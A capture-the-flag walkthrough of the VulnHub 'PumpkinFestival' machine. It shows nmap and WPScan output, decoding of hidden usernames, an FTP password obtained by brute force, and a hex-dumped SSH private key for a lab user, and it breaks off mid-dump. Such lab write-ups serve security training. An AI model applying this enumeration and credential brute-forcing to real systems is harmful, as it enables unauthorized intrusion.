PumpkinFestival

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Wordpress use enumeration
[+] Base62 Decode https://gchq.github.io/CyberChef/
[+] Privilege Escalation abusing SUDO rights -  script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 00:05 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00057s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jul 12 22:26 secret
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 4 disallowed entries 
|_/wordpress/ /tokens/ /users/ /store/track.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Mission-Pumpkin
MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After adding modifying the /etc/hosts file we found the store site for the pumpkins.local

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/pumpkinFestival# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kal1
192.168.56.104	pumpkins.local

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


It is based on Wordpress
![Alt Tag]()

Enumerating users for Wordpress


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/pumpkinFestival# wpscan --url http://pumpkins.local/ --enumerate u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://pumpkins.local/
[+] Started: Sun Oct 20 00:11:39 2019

Interesting Finding(s):

[+] http://pumpkins.local/
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://pumpkins.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://pumpkins.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: http://pumpkins.local/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://pumpkins.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.9.3 identified (Insecure, released on 2018-02-05).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://pumpkins.local/?feed=rss2, <generator>https://wordpress.org/?v=4.9.3</generator>
 |  - http://pumpkins.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.9.3</generator>
 |
 | [!] 15 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9021
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9053
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9054
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9055
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9100
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9222
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9230
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.9.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentyseventeen
 | Location: http://pumpkins.local/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://pumpkins.local/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://pumpkins.local/wp-content/themes/twentyseventeen/style.css?ver=4.9.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://pumpkins.local/wp-content/themes/twentyseventeen/style.css?ver=4.9.3, Match: 'Version: 1.4'

[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] morse
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Sun Oct 20 00:11:40 2019
[+] Requests Done: 20
[+] Cached Requests: 36
[+] Data Sent: 3.999 KB
[+] Data Received: 519.694 KB
[+] Memory used: 772 KB
[+] Elapsed time: 00:00:01

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We get users : admin, morse
and an interesting file : 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/pumpkinFestival# curl http://pumpkins.local/readme.html
<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>WordPress &#8250; ReadMe</title>
	<link rel="stylesheet" href="wp-admin/css/install.css?ver=20100228" type="text/css" />
</head>
<body>
<h1 id="logo">
	<a href="https://wordpress.org/"><img alt="WordPress" src="wp-admin/images/wordpress-logo.png" /></a>
</h1>
<p style="text-align: center">Semantic Personal Publishing Platform</p>

<center><h2>-- This content is removed because of security purposes --</h2>
<p>K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s</p></center>

</body>
</html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



The string K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s  is a base62 encoding.
Going to https://base62.io/ we were able to decode it.

![Alt Tag]()

So we got user, morse, jack, admin and harry.
Trying to bruteforce the credentials for ftp, we get the password for harry :  yrrah

Ug0t!TrlpyJ

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ ftp
ftp> open 192.168.56.104
Connected to 192.168.56.104.
220 Welcome to Pumpkin's FTP service.
Name (192.168.56.104:setrus): harry
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 12 18:11 Donotopen
-rw-r--r--    1 0        0              48 Jul 12 22:33 token.txt
226 Directory send OK.
ftp> cd Donotopen
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 12 18:17 NO
226 Directory send OK.
ftp> cd NO
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 12 18:12 NOO
226 Directory send OK.
ftp> cd NOO
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 12 18:12 NOOO
226 Directory send OK.
ftp> cd NOOO
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 12 22:35 NOOOO
226 Directory send OK.
ftp> cd NOOOO
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 14 03:12 NOOOOO
-rw-r--r--    1 0        0              48 Jul 12 22:35 token.txt
226 Directory send OK.
ftp> cd NOOOOO
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 14 03:13 NOOOOOO
226 Directory send OK.
ftp> cd NOOOOOO
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            4357 Jul 14 03:08 data.txt
226 Directory send OK.
ftp> get data.txt
local: data.txt remote: data.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for data.txt (4357 bytes).
226 Transfer complete.
4357 bytes received in 0.00 secs (1.4508 MB/s)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Data.txt is a Zip file that contains several zips -  that enentually get to jack ssh keys.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ tar vxf key
jack
tar: A lone zero block at 22
setrus@host:~$ ls jack
jack
setrus@host:~$ cat jack 
2d 2d 2d 2d 2d 42 45 47 49 4e 20 4f 50 45 4e 53 53 48 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0a 62 33 42 6c 62 6e 4e 7a 61 43 31 72 5a 58 6b 74 64 6a 45 41 41 41 41 41 42 47 35 76 62 6d 55 41 41 41 41 45 62 6d 39 75 5a 51 41 41 41 41 41 41 41 41 41 42 41 41 41 43 46 77 41 41 41 41 64 7a 63 32 67 74 63 6e 0a 4e 68 41 41 41 41 41 77 45 41 41 51 41 41 41 67 45 41 77 49 49 6e 79 67 68 64 6a 32 66 73 5a 59 4a 4a 32 56 33 4c 37 51 74 72 63 6c 4a 70 7a 74 74 35 39 6d 33 57 6d 6e 34 79 39 73 70 4d 73 64 32 74 71 4a 32 62 0a 46 7a 69 71 6a 32 65 2b 6a 5a 61 4b 44 57 54 39 74 79 51 46 45 56 57 4f 73 33 34 4f 51 68 33 73 6a 67 41 7a 75 32 74 4c 47 75 50 70 67 69 35 5a 75 38 79 6e 77 55 42 4d 4b 37 48 65 2b 38 31 73 50 76 45 54 76 65 0a 62 63 64 71 70 75 7a 67 73 41 77 44 35 70 43 31 7a 35 4c 54 37 65 4f 41 49 6d 4b 48 78 32 6d 73 6f 48 74 31 76 4f 71 65 50 44 4e 50 76 50 48 52 47 32 30 79 55 68 52 47 75 6f 46 75 34 62 6c 4b 57 77 75 6e 34 2b 0a 59 62 65 42 4d 48 30 4c 6c 7a 7a 4a 68 6e 71 4b 41 6b 46 37 6f 45 66 5a 36 56 37 2f 31 79 45 4e 73 72 64 2b 38 65 77 47 5a 67 36 33 70 6f 30 49 32 43 6f 56 7a 47 4a 62 6f 78 48 44 6a 62 54 67 69 4e 4e 30 58 57 0a 78 32 67 33 6f 44 4f 55 73 42 49 59 6a 62 75 54 64 43 74 33 52 32 72 37 52 68 65 79 58 6c 52 67 74 73 38 47 35 62 5a 65 39 66 56 69 41 6c 32 36 4f 67 37 6a 7a 47 64 6a 49 72 33 79 38 6e 73 2f 6d 70 4a 37 33 36 0a 65 33 6a 51 50 53 48 43 73 45 65 6d 63 53 6a 39 7a 57 44 70 58 70 48 73 69 56 58 35 4f 64 43 6b 6d 79 61 4a 4c 46 5a 70 66 58 6a 68 42 35 7a 33 78 36 76 31 69 53 41 6b 7a 73 48 43 68 50 65 44 7a 62 6f 53 78 6a 0a 78 7a 4b 5a 62 38 79 65 59 68 4e 47 50 30 6f 63 68 45 50 41 52 66 49 38 6a 49 6e 49 49 35 57 76 38 6a 74 42 71 54 4b 71 50 37 7a 75 35 30 4f 7a 55 78 4a 7a 46 7a 43 4d 50 4c 66 4a 4e 57 64 5a 4c 2f 4b 41 77 62 0a 54 56 32 4b 39 30 37 35 68 76 44 45 51 44 31 6d 48 36 49 56 56 4a 79 72 4e 75 72 75 53 52 4e 41 76 54 45 74 4c 57 43 70 49 34 38 48 6f 73 33 57 47 6a 7a 73 6d 4d 75 41 37 39 57 47 71 42 7a 57 79 53 35 6b 67 30 0a 77 56 63 6b 4a 41 44 4c 67 70 4c 45 69 45 2b 4e 65 39 41 62 56 4f 71 4c 6e 53 42 68 30 41 56 32 6d 44 32 73 32 48 6d 66 52 37 66 30 38 30 54 71 58 78 41 6f 74 36 2b 37 41 44 6f 2f 39 36 4e 66 33 5a 6e 6e 42 45 0a 4f 35 31 36 51 33 57 6c 6d 76 6f 5a 62 51 33 33 6d 4d 53 73 4f 49 74 42 4c 65 6a 50 58 70 33 4c 71 38 4c 62 31 39 6d 32 44 32 62 5a 32 4d 44 6f 43 2b 42 63 72 2b 70 6f 2f 72 72 39 41 4c 52 4b 69 55 73 56 74 73 0a 73 41 41 41 64 41 51 78 6d 58 6c 45 4d 5a 6c 35 51 41 41 41 41 48 63 33 4e 6f 4c 58 4a 7a 59 51 41 41 41 67 45 41 77 49 49 6e 79 67 68 64 6a 32 66 73 5a 59 4a 4a 32 56 33 4c 37 51 74 72 63 6c 4a 70 7a 74 74 35 0a 39 6d 33 57 6d 6e 34 79 39 73 70 4d 73 64 32 74 71 4a 32 62 46 7a 69 71 6a 32 65 2b 6a 5a 61 4b 44 57 54 39 74 79 51 46 45 56 57 4f 73 33 34 4f 51 68 33 73 6a 67 41 7a 75 32 74 4c 47 75 50 70 67 69 35 5a 75 38 0a 79 6e 77 55 42 4d 4b 37 48 65 2b 38 31 73 50 76 45 54 76 65 62 63 64 71 70 75 7a 67 73 41 77 44 35 70 43 31 7a 35 4c 54 37 65 4f 41 49 6d 4b 48 78 32 6d 73 6f 48 74 31 76 4f 71 65 50 44 4e 50 76 50 48 52 47 32 0a 30 79 55 68 52 47 75 6f 46 75 34 62 6c 4b 57 77 75 6e 34 2b 59 62 65 42 4d 48 30 4c 6c 7a 7a 4a 68 6e 71 4b 41 6b 46 37 6f 45 66 5a 36 56 37 2f 31 79 45 4e 73 72 64 2b 38 65 77 47 5a 67 36 33 70 6f 30 49 32 43 0a 6f 56 7a 47 4a 62 6f 78 48 44 6a 62 54 67 69 4e 4e 30 58 57 78 32 67 33 6f 44 4f 55 73 42 49 59 6a 62 75 54 64 43 74 33 52 32 72 37 52 68 65 79 58 6c 52 67 74 73 38 47 35 62 5a 65 39 66 56 69 41 6c 32 36 4f 67 0a 37 6a 7a 47 64 6a 49 72 33 79 38 6e 73 2f 6d 70 4a 37 33 36 65 33 6a 51 50 53 48 43 73 45 65 6d 63 53 6a 39 7a 57 44 70 58 70 48 73 69 56 58 35 4f 64 43 6b 6d 79 61 4a 4c 46 5a 70 66 58 6a 68 42 35 7a 33 78 36 0a 76 31 69 53 41 6b 7a 73 48 43 68 50 65 44 7a 62 6f 53 78 6a 78 7a 4b 5a 62 38 79 65 59 68 4e 47 50 30 6f 63 68 45 50 41 52 66 49 38 6a 49 6e 49 49 35 57 76 38 6a 74 42 71 54 4b 71 50 37 7a 75 35 30 4f 7a 55 78 0a 4a 7a 46 7a 43 4d 50 4c 66 4a 4e 57 64 5a 4c 2f 4b 41 77 62 54 56 32 4b 39 30 37 35 68 76 44 45 51 44 31 6d 48 36 49 56 56 4a 79 72 4e 75 72 75 53 52 4e 41 76 54 45 74 4c 57 43 70 49 34 38 48 6f 73 33 57 47 6a 0a 7a 73 6d 4d 75 41 37 39 57 47 71 42 7a 57 79 53 35 6b 67 30 77 56 63 6b 4a 41 44 4c 67 70 4c 45 69 45 2b 4e 65 39 41 62 56 4f 71 4c 6e 53 42 68 30 41 56 32 6d 44 32 73 32 48 6d 66 52 37 66 30 38 30 54 71 58 78 0a 41 6f 74 36 2b 37 41 44 6f 2f 39 36 4e 66 33 5a 6e 6e 42 45 4f 35 31 36 51 33 57 6c 6d 76 6f 5a 62 51 33 33 6d 4d 53 73 4f 49 74 42 4c 65 6a 50 58 70 33 4c 71 38 4c 62 31 39 6d 32 44 32 62 5a 32 4d 44 6f 43 2b 0a 42 63 72 2b 70 6f 2f 72 72 39 41 4c 52 4b 69 55 73 56 74 73 73 41 41 41 41 44 41 51 41 42 41 41 41 43 41 42 41 6b 32 69 46 66 51 6a 6c 63 68 62 36 64 68 6f 50 73 45 63 58 33 52 7a 4e 33 4a 64 68 72 48 33 64 44 0a 44 74 51 31 38 53 41 78 4a 75 31 6a 6f 63 53 61 4d 76 39 6e 69 53 59 74 6c 52 56 61 6f 6f 6b 74 42 76 6e 73 30 31 2f 34 78 4e 62 59 6f 32 6c 34 43 50 5a 2f 6e 64 63 42 30 48 4b 59 32 6d 52 49 62 73 34 4a 41 36 0a 68 35 4d 2b 6f 57 4b 4a 55 46 54 53 61 61 49 51 57 7a 37 70 6b 6c 41 64 58 56 70 6d 4a 34 32 57 5a 53 6a 62 4c 31 71 72 30 58 73 51 75 45 4a 49 34 6d 6b 79 38 56 53 2b 65 44 61 6b 4e 76 4f 70 63 39 66 51 2b 48 0a 39 5a 6f 2f 54 51 46 66 52 6f 44 59 78 46 46 66 64 4f 76 4d 37 39 43 5a 4b 2f 65 71 36 56 75 56 75 79 30 6c 51 4c 44 59 56 62 58 30 65 5a 41 59 2f 59 55 58 54 6c 59 4c 62 52 33 78 37 67 54 52 6e 77 52 42 77 30 0a 49 34 6e 57 61 33 66 71 62 4c 6e 47 6a 64 45 73 30 69 34 32 31 7a 4e 67 49 41 41 45 42 48 73 65 56 2b 64 4f 48 64 71 6e 5a 68 73 69 73 5a 71 6e 69 4e 54 4c 31 39 41 37 30 77 72 64 59 54 4c 42 6d 58 52 30 2b 7a 0a 57 52 46 67 63 37 31 72 76 76 43 67 35 30 61 6c 37 2f 4f 61 31 68 76 4b 55 51 46 43 45 36 67 70 4c 63 72 37 53 2f 71 65 76 77 56 58 39 49 46 37 50 6b 56 35 2b 41 6c 54 6c 6e 7a 70 5a 4b 39 30 30 4a 61 74 32 53 0a 69 5a 49 47 52 75 37 2b 30 4f 50 44 5a 75 53 41 35 64 4b 4e 35 2f 66 6d 5a 6f 43 6d 75 6b 5a 38 4b 57 47 63 61 6f 31 6d 72 35 51 6a 56 62 37 53 52 4f 55 41 35 73 62 76 5a 51 54 55 77 4a 6f 43 76 78 6a 37 49 4f 0a 77 47 45 63 45 48 42 42 56 64 43 2f 41 72 65 6e 78 59 78 71 68 31 41 53 64 43 74 56 78 5a 2f 42 56 74 77 2f 30 79 42 54 73 45 6f 44 69 48 2f 6e 48 37 53 6e 76 63 55 62 39 78 69 71 31 58 32 6d 75 34 6d 56 36 66 0a 79 51 7a 39 4d 53 77 50 68 4d 43 79 59 72 6f 49 7a 4c 30 72 6e 39 64 71 6d 6e 70 72 36 4b 57 43 78 6e 58 50 35 4b 4a 47 38 65 4e 53 37 42 70 62 42 6c 63 71 45 70 49 6f 54 39 33 58 58 63 54 48 79 55 73 67 4a 6f 0a 76 48 36 54 74 5a 68 38 37 4c 36 49 5a 69 38 54 38 50 72 61 5a 61 6a 31 72 78 63 4e 61 33 52 6c 43 2b 76 32 69 38 6b 79 6e 6a 51 72 6c 47 54 74 74 57 39 51 32 71 4e 77 39 38 68 65 6b 63 53 72 58 4b 69 6a 58 31 0a 32 6c 61 59 6e 63 39 66 43 4a 4b 79 37 5a 45 63 2b 42 41 41 41 42 41 51 43 6f 35 4f 7a 35 51 30 48 62 63 42 6b 7a 69 71 4b 37 30 77 72 6c 6d 34 57 6e 59 78 55 30 38 49 30 49 75 30 73 58 42 63 45 70 46 32 44 41 0a 4b 45 45 31 52 46 35 54 63 68 33 61 6e 72 57 6e 52 39 4d 2f 42 41 56 76 43 43 52 70 71 65 7a 4a 36 42 59 4f 42 69 6b 46 56 77 45 55 44 6c 78 53 50 4e 70 4e 6b 4a 52 6c 2b 71 54 43 2f 50 30 46 72 2f 4b 75 52 74 0a 66 2b 78 57 6b 63 58 65 50 6a 59 46 37 59 78 72 73 37 33 6e 55 79 57 55 33 44 72 39 74 63 44 75 51 59 78 44 70 74 6c 54 49 62 41 6d 76 6b 49 65 34 7a 42 2b 46 76 66 75 31 4c 51 4c 68 41 61 48 52 6f 70 54 68 73 0a 6c 79 5a 4f 61 39 7a 51 55 6f 54 71 62 75 2f 64 6b 73 2b 48 4e 71 30 66 69 62 68 36 6f 78 6b 47 78 63 69 6e 78 63 65 6a 44 38 6a 30 78 79 71 68 75 64 32 41 6c 53 2b 33 54 51 71 39 70 64 49 49 78 2f 5a 77 4c 49 0a 66 4e 71 7a 47 53 38 79 34 4a 6f 6a 4b 47 6e 79 73 35 35 73 64 54 6b 33 53 42 68 4e 38 36 75 66 4d 7a 56 33 75 6c 33 54 6a 39 71 71 79 6d 74 51 48 43 39 6d 30 52 6f 66 59 57 51 68 6f 69 6c 49 71 7a 61 52 59 50 0a 6b 57 4f 75 52 48 65 62 4b 6f 43 79 41 41 57 32 41 41 41 42 41 51 44 31 78 58 48 35 38 34 48 73 68 69 59 66 51 4a 78 42 58 4b 5a 68 53 47 47 72 66 57 38 32 2f 55 38 4b 35 59 2b 54 2f 53 5a 4f 56 33 47 78 2f 74 0a 77 6a 58 58 59 4c 6f 43 57 6a 59 79 75 37 48 4a 68 48 6d 65 64 30 41 6d 73 4d 72 76 42 77 79 48 4d 34 70 48 57 32 72 34 49 76 66 4b 71 78 69 78 33 4c 72 33 34 31 36 69 73 75 2b 2f 50 57 73 46 63 2b 51 6b 49 6b 0a 6b 6a 65 6b 36 50 4f 49 59 4a 79 74 6e 7a 5a 67 72 7a 55 41 51 46 2b 6b 66 68 39 50 78 6b 4a 6e 63 68 49 6d 2b 33 59 53 77 5a 59 45 38 6e 41 5a 78 54 53 58 47 67 4d 57 53 57 71 46 77 4e 39 6f 4f 2f 50 33 38 4c 0a 75 6c 6c 63 65 59 68 79 6e 35 5a 56 2f 4e 76 53 56 69 2b 4d 6c 4b 77 33 2b 43 68 70 50 5a 4d 59 76 71 6e 67 64 59 50 6b 53 33 4f 76 78 35 55 4f 5a 7a 50 6a 74 52 6b 79 6c 57 42 48 5a 42 35 30 67 44 67 66 64 31 0a 6b 78 42 37 52 6d 70 6a 76 6a 38 49 33 48 4d 63 58 74 32 66 79 67 63 36 51 72 33 35 61 4d 43 63 41 7a 58 4e 49 79 46 31 46 49 4d 73 57 6d 78 44 6a 75 55 36 71 76 2b 66 6b 47 79 78 38 59 6b 6b 63 62 42 37 35 62 0a 48 6e 44 42 36 43 2b 6b 42 41 6c 32 72 7a 41 41 41 42 41 51 44 49 68 54 6c 32 54 77 6e 52 39 36 42 4a 4f 35 4b 54 39 32 36 4f 54 4f 6d 35 77 36 71 78 34 47 75 4d 46 32 42 39 50 53 74 51 4e 64 